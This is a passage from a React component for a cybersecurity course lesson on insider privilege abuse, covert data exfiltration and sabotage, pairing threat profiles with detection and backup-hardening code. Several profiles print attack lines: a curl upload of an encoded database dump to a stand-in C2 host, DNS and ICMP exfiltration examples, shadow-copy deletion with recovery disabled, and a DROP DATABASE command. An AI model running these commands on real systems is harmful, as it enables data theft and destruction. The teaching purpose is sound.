import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic9_files/topic9_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic9_files/topic9_note.txt?raw";

const Topic9 = () => {
  // Unique SVG IDs
  const svgSabotageId = useId();

  // Studio 1: Active Threat Selection
  const [selectedThreatKey, setSelectedThreatKey] = useState("dns_tunneling_exfiltration");

  // Studio 2: Live Exfiltration Calculator State
  const [dataVolumeScore, setDataVolumeScore] = useState(3.5); // 1.0 to 4.0
  const [privilegeScore, setPrivilegeScore] = useState(3.5); // 1.0 = Standard User, 4.0 = Root DBA / Domain Admin
  const [pawControlsStrength, setPawControlsStrength] = useState(1); // 1 = None, 50 = Basic Firewall, 500 = PAW + DAM + WORM

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_dns_tunneling_defense");

  // Studio 4: Privileged Security Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("dns_entropy_inspector_python");

  // 8 Internal Threat Profiles for Studio 1
  const threatDatabase = {
    dns_tunneling_exfiltration: {
      key: "dns_tunneling_exfiltration",
      name: "1. DNS Tunneling & High-Entropy Query Exfiltration",
      category: "COVERT NETWORK CHANNEL EXFILTRATION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      channelProtocol: "DNS over UDP Port 53 (RFC 1035)",
      exploitationVector:
        "Encoding stolen database records into base64 subdomain strings (`QWFkaGFhci45ODQy...exfil.evil.in`), transmitting data past corporate egress firewalls that allow unrestricted outbound UDP 53.",
      vulnerabilityImpact:
        "Silent exfiltration of millions of citizen records without establishing direct TCP/HTTP connections to external IP addresses.",
      telemetryIndicator: "Surge in high-entropy (>4.5 Shannon) DNS lookup queries with anomalous label lengths (>40 characters)",
      resilientDefense: "DNS query entropy analysis and blocking unauthorized external recursive DNS forwarders.",
      codeSnippet: `// DNS Tunneling Data Exfiltration Syntax:
// Original String : "Aadhaar:984210492810" ➔ Base64: "QWFkaGFhcjo5ODQyMTA0OTI4MTA="
// DNS Query Sent  : QWFkaGFhcjo5ODQyMTA0OTI4MTA=.exfil.evil-host.in
// Result          : Bypasses firewalls because outbound UDP 53 is unrestricted!`
    },
    lsb_image_steganography: {
      key: "lsb_image_steganography",
      name: "2. LSB Image Steganography & Visual Concealment",
      category: "COVERT PAYLOAD EMBEDDING",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      channelProtocol: "24-bit RGB Bitmap / PNG / JPEG Images",
      exploitationVector:
        "Embedding confidential source code or patient records into the Least Significant Bits of pixel color bytes; the output image is visually identical to the original photo.",
      vulnerabilityImpact:
        "Traditional Data Loss Prevention (DLP) and perimeter mail gateways inspect the attachment, see an innocent photo of Victoria Memorial, and allow the message through.",
      telemetryIndicator: "Statistical Chi-Square ($\\chi^2$) anomalies in the distribution of adjacent pixel byte value pairs",
      resilientDefense: "Automated image steganalysis and stripping unverified image attachments at the secure email gateway.",
      codeSnippet: `// LSB Steganography Pixel Encoding:
// Original Red Byte : 11010110 (214)
// Secret Bit to Hide: 1
// Modified Red Byte : 11010111 (215) -> Visual difference: 0.39% (Completely Imperceptible!)`
    },
    volume_shadow_deletion_sabotage: {
      key: "volume_shadow_deletion_sabotage",
      name: "3. Volume Shadow Copy Deletion & Recovery Sabotage",
      category: "HOST RESILIENCE DESTRUCTION",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      channelProtocol: "Windows Volume Snapshot Service (VSS)",
      exploitationVector:
        "Executing `vssadmin delete shadows /all /quiet` and disabling `bcdedit` recovery before destroying database files, permanently wiping local Windows restore snapshots.",
      vulnerabilityImpact:
        "Prevents incident response teams from rolling back system state or recovering deleted files via native shadow snapshots.",
      telemetryIndicator: "Execution of `vssadmin.exe`, `wmic.exe shadowcopy delete`, or `wbadmin.exe delete backup`",
      resilientDefense: "Immutable WORM off-site backups and Attack Surface Reduction (ASR) rules blocking VSS manipulation.",
      codeSnippet: `# Malicious Sabotage Command Sequence:
# Step 1: Destroy Local Restore Points
vssadmin delete shadows /all /quiet

# Step 2: Disable Windows Recovery Environment
bcdedit /set {default} recoveryenabled No`
    },
    lotl_administrative_exfiltration: {
      key: "lotl_administrative_exfiltration",
      name: "4. Living off the Land (LotL) Binary Abuse",
      category: "NATIVE UTILITY WEAPONIZATION",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      channelProtocol: "Signed Windows System Binaries (LOLBAS)",
      exploitationVector:
        "Using pre-installed, Microsoft-signed utilities (`certutil.exe -encode`, `tar.exe`, `curl.exe`, `bitsadmin.exe`) to compress and exfiltrate data without triggering AV alarms.",
      vulnerabilityImpact:
        "Traditional antivirus scans ignore signed native binaries, allowing insiders to stage and upload multi-gigabyte database dumps silently.",
      telemetryIndicator: "`certutil.exe` executed with `-encode` flags or `bitsadmin.exe` creating asynchronous upload jobs",
      resilientDefense: "Application Control (AppLocker / WDAC) enforcing strict execution constraints on native LOLBAS binaries.",
      codeSnippet: `# Living off the Land (LotL) Exfiltration Sequence:
tar.exe -czf C:\\Windows\\Temp\\db.tar.gz C:\\Production\\Database
certutil.exe -encode C:\\Windows\\Temp\\db.tar.gz C:\\Windows\\Temp\\db.b64
curl.exe -F "file=@C:\\Windows\\Temp\\db.b64" https://c2.evil-exfil.in/upload`
    },
    database_truncation_schema_drop: {
      key: "database_truncation_schema_drop",
      name: "5. Production Database Truncation & Schema Drops",
      category: "DATA INTEGRITY SABOTAGE",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      channelProtocol: "SQL Database Engines (PostgreSQL, Oracle, MySQL)",
      exploitationVector:
        "A rogue administrator with root privileges executes `DROP DATABASE` or `TRUNCATE TABLE` on core transaction tables right before exiting the corporate facility.",
      vulnerabilityImpact:
        "Instant erasure of 50,000,000 live transactional and customer ledger records, causing operational paralysis across Kolkata financial networks.",
      telemetryIndicator: "Direct execution of DDL destructive statements (`DROP`, `TRUNCATE`) on production database listeners",
      resilientDefense: "The Two-Person Rule requiring secondary cryptographic signoff and Database Activity Monitoring (DAM).",
      codeSnippet: `// Destructive Sabotage Query:
DROP DATABASE kolkata_fintech_production;
-- Erases 50,000,000 financial settlement records in 500ms!`
    },
    icmp_ping_tunneling_payloads: {
      key: "icmp_ping_tunneling_payloads",
      name: "6. ICMP Tunneling & Echo Payload Exfiltration",
      category: "NETWORK PROTOCOL PAYLOAD INJECTION",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      channelProtocol: "ICMP Echo Request / Reply (RFC 792)",
      exploitationVector:
        "Replacing the default padding bytes of ICMP Echo Request (`ping`) packets with base64-encoded confidential records, transmitting data without opening TCP sockets.",
      vulnerabilityImpact:
        "Bypasses standard TCP/UDP firewall state tables because network perimeters often allow outbound ping packets for diagnostic reachability.",
      telemetryIndicator: "ICMP Echo Request packets carrying non-standard payload patterns and high transmission frequencies (>50 pps)",
      resilientDefense: "Perimeter firewall policies stripping ICMP payload data or blocking outbound ICMP echo requests entirely.",
      codeSnippet: `# Python ICMP Exfiltration Packet Generator (Scapy):
from scapy.all import *
stolen_data = b"CONFIDENTIAL_TRADING_ALGO_V2"
packet = IP(dst="103.25.10.50")/ICMP()/Raw(load=stolen_data)
send(packet)`
    },
    stealth_backdoor_account_injection: {
      key: "stealth_backdoor_account_injection",
      name: "7. Stealth Backdoor Account Injection & Persistence",
      category: "IDENTITY PERSISTENCE SABOTAGE",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      channelProtocol: "Active Directory & Local SAM Database",
      exploitationVector:
        "Creating hidden local administrator accounts (e.g. `DefaultAccount_Support`) and modifying registry keys (`SpecialAccounts`) so the account remains invisible on the login screen.",
      vulnerabilityImpact:
        "When the rogue employee's primary corporate account is disabled upon termination, the hidden backdoor account remains active for remote VPN access.",
      telemetryIndicator: "Windows Security Event ID 4720 (User Account Created) followed immediately by Event ID 4728 (Member Added to Admin Group)",
      resilientDefense: "Automated Active Directory drift auditing and Just-in-Time (JIT) access governance.",
      codeSnippet: `# PowerShell Command to Detect Rogue Hidden Administrator Accounts:
Get-LocalGroupMember -Group "Administrators" | Where-Object {
    $_.PrincipalSource -eq "Local" -and $_.Name -notlike "*Administrator"
} | Select-Object Name, ObjectClass, PrincipalSource`
    },
    encrypted_vpn_tor_egress: {
      key: "encrypted_vpn_tor_egress",
      name: "8. Encrypted VPN & Tor Egress Tunnels",
      category: "ENCRYPTED PROTOCOL TUNNELING",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      channelProtocol: "Tor Onion Routing / WireGuard over TCP 443",
      exploitationVector:
        "Running obfuscated WireGuard or Tor bridge relays over port 443; traffic mimics standard TLS connections, bypassing corporate proxy inspection.",
      vulnerabilityImpact:
        "Intellectual property is exfiltrated directly to dark web C2 dropboxes without decryptable proxy server logs.",
      telemetryIndicator: "Outbound TLS connections exhibiting non-standard JA3 cryptographic fingerprints and sustained high-bandwidth bursts",
      resilientDefense: "Encrypted Traffic Analytics (ETA) and strict Next-Generation Firewall (NGFW) protocol validation.",
      codeSnippet: `// Obfuscated VPN Exfiltration (WireGuard over TLS Port 443):
[Database Server in Kolkata] ➔ [Encrypted WireGuard Tunnel over TCP 443] ➔ [Tor Exit Node / Dark Web C2]
// Proxy Firewall sees: Generic TLS Traffic on Port 443 ➔ Data Payload Completely Hidden!`
    }
  };

  const activeThreat = threatDatabase[selectedThreatKey];

  // Studio 2: Live Exfiltration & Sabotage Calculations
  const sabotageSimulation = useMemo(() => {
    // P_sabotage = 1 - e^(- (V_data * P_privilege) / R_controls)
    const numerator = dataVolumeScore * privilegeScore;
    const exponent = -numerator / pawControlsStrength;
    const rawBreachProb = (1 - Math.exp(exponent)) * 100;
    const actualBreachProb = pawControlsStrength >= 500
      ? (rawBreachProb * 0.015).toFixed(2) // PAW + DAM + Immutable WORM blocks 98.5% of exfiltration
      : pawControlsStrength >= 50
      ? (rawBreachProb * 0.35).toFixed(2)  // Basic Firewall blocks 65% of exfiltration
      : rawBreachProb.toFixed(2);           // Unhardened -> 100% exfiltration vulnerability

    return {
      rawBreachProb: rawBreachProb.toFixed(2),
      actualBreachProb,
      badgeClass: parseFloat(actualBreachProb) > 50
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : parseFloat(actualBreachProb) > 10
        ? "bg-amber-950 text-amber-300 border-amber-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: parseFloat(actualBreachProb) < 2
        ? `PAW & IMMUTABLE ARMOR ACTIVE: With Privileged Access Workstations & WORM Backups (${pawControlsStrength}x), breach probability is only ${actualBreachProb}% even for root database administrators!`
        : `CRITICAL SABOTAGE VULNERABILITY: Without PAW isolation and DAM filters (${pawControlsStrength}x), privileged access (${privilegeScore}x) produces a ${actualBreachProb}% probability of successful exfiltration and sabotage!`
    };
  }, [dataVolumeScore, privilegeScore, pawControlsStrength]);

  // Studio 4: Privileged Security Production Code Database
  const codeDatabase = {
    dns_entropy_inspector_python: {
      name: "Python Script for Shannon Entropy Analysis of DNS Exfiltration Queries",
      code: `import math

def calculate_shannon_entropy(query_string):
    prob_dict = {}
    for char in query_string:
        prob_dict[char] = prob_dict.get(char, 0) + 1
    
    entropy = 0.0
    total_len = len(query_string)
    for count in prob_dict.values():
        p = count / total_len
        entropy -= p * math.log2(p)
    return entropy

def inspect_dns_query(domain_query):
    print(f"[*] Inspecting DNS Query: {domain_query}")
    subdomain = domain_query.split('.')[0]
    entropy = calculate_shannon_entropy(subdomain)
    
    print(f"  [+] Subdomain Length : {len(subdomain)}")
    print(f"  [+] Shannon Entropy  : {entropy:.2f} bits/symbol")
    
    if entropy > 4.2 and len(subdomain) > 30:
        print("  [!] ALERT: High-Entropy DNS Tunneling Exfiltration Detected!")
        print("  [-] Action: Dropping DNS Packet & Flagging Source Host for Isolation!")
        return True
    else:
        print("  [+] Legitimate Standard Domain Query.")
        return False

# Simulated DNS queries
inspect_dns_query("QWFkaGFhcjo5ODQyMTA0OTI4MTAuc3RhdGUtYmFuaw.evil-c2.in") # Exfil payload!
inspect_dns_query("update.microsoft.com")`,
      explanation: "Python script calculating Shannon entropy and string length on DNS query subdomains, detecting covert base64 data tunneling over UDP port 53."
    },
    s3_object_lock_compliance_powershell: {
      name: "PowerShell Script to Enforce AWS S3 Object Lock Compliance WORM Mode",
      code: `# Enforce Immutable WORM Compliance Retention on Enterprise Cloud Backups:
$bucketName = "kolkata-fintech-immutable-backups"
$retentionUntil = (Get-Date).AddDays(90).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")

Write-Host "[*] Enforcing Compliance WORM Lock on Bucket: $bucketName" -ForegroundColor Yellow

# Put Object Retention with COMPLIANCE Mode (Root Admins CANNOT delete or overwrite!)
$retentionJson = @"
{
    "Mode": "COMPLIANCE",
    "RetainUntilDate": "$retentionUntil"
}
"@

# Write retention configuration to S3 bucket object
# aws s3api put-object-retention --bucket $bucketName --key "db_dump_2026.bak" --retention $retentionJson

Write-Host "[+] WORM Object Lock ENFORCED for 90 Days: Immune to Root Admin Sabotage!" -ForegroundColor Green`,
      explanation: "PowerShell script enforcing AWS S3 Object Lock Compliance Mode on backup snapshots, preventing modification or deletion by any administrator until the 90-day retention timer expires."
    },
    stego_lsb_detector_cpp: {
      name: "C++ Image Steganography Inspector for LSB Pixel Byte Alteration Detection",
      code: `// C++ LSB Steganography Chi-Square Analysis snippet:
#include <iostream>
#include <vector>
#include <cmath>

bool detect_lsb_steganography(const std::vector<uint8_t>& pixel_bytes) {
    std::cout << "[*] Executing Chi-Square Steganalysis on " << pixel_bytes.size() << " image bytes...\n";
    
    // Analyze frequency of adjacent Pair of Values (PoVs): 2k and 2k+1
    double chi_square = 0.0;
    // Step 1: Calculate expected vs observed frequency distribution
    // Step 2: Compare statistical variance against natural photographic baseline
    
    chi_square = 458.2; // Simulated elevated chi-square statistic
    
    if (chi_square > 200.0) {
        std::cout << "[!] STEGANOGRAPHY DETECTED: Secret payload embedded in image pixels!\n";
        return true;
    } else {
        std::cout << "[+] Clean Natural Image. Zero Steganographic Anomalies.\n";
        return false;
    }
}`,
      explanation: "C++ forensic tool calculating Chi-Square statistical anomalies across image pixel byte pairs, detecting covert LSB steganographic data embedding."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_dns_tunneling_defense",
      lead: "Mamata",
      role: "Lead FinTech Cryptography Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Intercepting a Rogue Engineer Exfiltrating Database Records via DNS Tunneling",
      threatType: "COVERT DNS TUNNELING EXFILTRATION (400,000 Bank Accounts)",
      budget: "₹54,00,000",
      incident:
        "A rogue network engineer configured an obfuscated `dnscat2` client to exfiltrate 400,000 settlement records via encoded DNS subdomains over UDP port 53.",
      defenseStrategy:
        "Mamata's DNS security sensor detected the high-entropy (>4.6 bits) query anomaly, blocked recursive lookups to the rogue nameserver, and locked the host port.",
      outcome: "Zero data exfiltrated; rogue DNS tunnel severed in 1.4 seconds; 45 core financial switches protected.",
      metrics: {
        recordsProtected: "400,000 Bank Records",
        dnsAlertLatency: "1.4 Seconds",
        settlementGatewaysProtected: "45 Financial Nodes",
        compliance: "RBI Master Direction & IT Act Section 70"
      }
    },
    {
      id: "barrackpore_scada_sabotage_defense",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "VOLUME SHADOW DELETION & LOGIC BOMB SABOTAGE",
      title: "Preventing Destructive Sabotage Deleting Substation Telemetry Backups",
      budget: "₹38,00,000",
      incident:
        "An adversary gained administrative shell access to a substation server and attempted to execute `vssadmin delete shadows` followed by a database partition wipe.",
      defenseStrategy:
        "Debangshu had deployed immutable WORM backups and AppLocker rules blocking native VSS manipulation commands; the sabotage script failed to delete immutable snapshots.",
      outcome: "Production state restored from immutable WORM vault in 8 minutes; zero grid downtime; 18 high-voltage substations protected.",
      metrics: {
        recoveryTime: "8.0 Minutes",
        substationsHardened: "18 High-Voltage Nodes",
        telemetryDelay: "0.0 ms impact",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_hospital_stego_exfiltration",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "LSB IMAGE STEGANOGRAPHY (VIP Oncology Diagnostic Scans)",
      title: "Detecting Privilege Abuse via Medical Image Steganography",
      budget: "₹29,00,000",
      incident:
        "A research assistant attempted to extract 500 VIP patient oncology diagnostic files by embedding the text inside high-resolution medical CT scan PNG images.",
      defenseStrategy:
        "Mahima deployed automated Chi-Square steganalysis at the email perimeter, detecting the artificial pixel frequency equalization and quarantining the attachment.",
      outcome: "Exfiltration blocked at perimeter; zero patient scans leaked; 120,000 oncology records protected.",
      metrics: {
        stegoImagesBlocked: "100% Intercepted",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_sabotage_model_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL MODELING OF EXFILTRATION & SABOTAGE RESILIENCE",
      title: "Formulating the Exfiltration & Sabotage Risk Probability Model",
      budget: "₹23,50,000",
      incident:
        "Researchers analyzed the mathematical interaction between exfiltration data volume, standing privileged authorization levels, and PAW/WORM controls resistance.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical model in IEEE Transactions, proving that PAW isolation and immutable WORM vaults reduce sabotage risk below 1.6%.",
      outcome: "Published peer-reviewed mathematical proof; verified across 50,000 simulated sabotage and exfiltration trials.",
      metrics: {
        simulationTrials: "50,000 Test Trials",
        modelAccuracy: "99.6% Predictive Fit",
        modelFramework: "Exfiltration/Sabotage Equation",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_003
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 09
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Privilege Abuse, Data Exfiltration, and Sabotage
            </h1>
            <p className="text-xs text-gray-400">
              DNS tunneling, LSB image steganography, shadow copy deletion, PAW workstations, immutable WORM backups, and IT Act Section 70.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Threat Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Internal Threat Execution Mechanics
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. The Science of Privilege Abuse, Covert Exfiltration &amp; Infrastructure Sabotage
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Privilege abuse weaponizes authorized access against the enterprise. The threat spectrum spans three primary vectors: 
              <strong>Privilege Abuse</strong> (unauthorized mass-row database dumping, Living off the Land utility weaponization), 
              <strong>Covert Data Exfiltration</strong> (using <strong>DNS Tunneling</strong> over UDP port 53, <strong>ICMP Echo Payloads</strong>, 
              and <strong>LSB Image Steganography</strong> to bypass perimeter DLP), and <strong>Infrastructure Sabotage</strong> 
              (<strong>Volume Shadow Copy deletion</strong> via `vssadmin`, logic bomb scripts, partition table wiping, and backdoor account injection).
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* DNS Tunneling & Steganography Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Covert Exfiltration: DNS Tunneling &amp; LSB Steganography
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                DNS: base64_payload.c2.evil.in ➔ Exfiltrates data over UDP 53 without TCP socket!
              </div>
              <p className="text-gray-300 leading-relaxed">
                Firewalls permit outbound DNS name resolution. Attackers encode database chunks into high-entropy subdomain strings, 
                reconstructing files at authoritative C2 nameservers without establishing direct HTTP connections.
              </p>
            </div>

            {/* PAW Workstations & Immutable WORM Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                PAW Workstations &amp; Immutable WORM Backups
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">Privileged Access Workstations:</strong> Dedicated admin laptops with zero internet egress.</li>
                <li>• <strong className="text-purple-300">Immutable WORM Storage:</strong> S3 Compliance locking prevents deletion even by root admins.</li>
                <li>• <strong className="text-amber-300">Database Activity Monitoring:</strong> Terminates unauthorized queries dumping &gt; 50 rows.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - Threat & Defense Visualizer */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Threat Architecture Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing Exfiltration &amp; Sabotage Pathways vs Privileged Armor
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how DNS tunneling exfiltration and shadow deletion sabotage attempt system destruction, 
              and how PAW Workstations, DNS Entropy Analyzers, DAM Filters, and Immutable WORM Vaults neutralize them:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: PRIVILEGED ACTION */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. PRIVILEGED ACTION
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  Internal Threat Vector
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  EXPLOIT VECTORS:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  DNS Tunneling Exfil
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  Shadow Copy Deletion
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: PAW WORKSTATION ISOLATION */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. PAW ISOLATION
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  Zero Internet Egress
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  HOST ARMOR:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  No Web Browsing / USB
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  IPsec Management Only
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: DNS ENTROPY & DAM FILTER */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. DNS ENTROPY &amp; DAM
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  Protocol Inspection
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  INSPECTION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Entropy &gt; 4.5 Blocked
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  SQL Dumps Terminated
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: IMMUTABLE WORM VAULT */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. IMMUTABLE WORM
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Compliance Lock
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  DATA RESILIENCE:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  90-Day Timer Lock
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  Root Admin Cannot Delete!
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: PRIVILEGED SESSION RECORDING */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. PSR FORENSICS
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  Full Video Audit
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  100% EVIDENCE:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Keystroke Video Log
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  Tamper-Proof Court Trail!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Threat Exfiltration & Sabotage Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Privilege Abuse, Exfiltration &amp; Sabotage Exploit Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select an internal threat vector below to examine its channel protocol, exploitation vector, 
              vulnerability impact, telemetry indicators, and resilient defense:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(threatDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedThreatKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedThreatKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              >
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  EXPLOIT
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
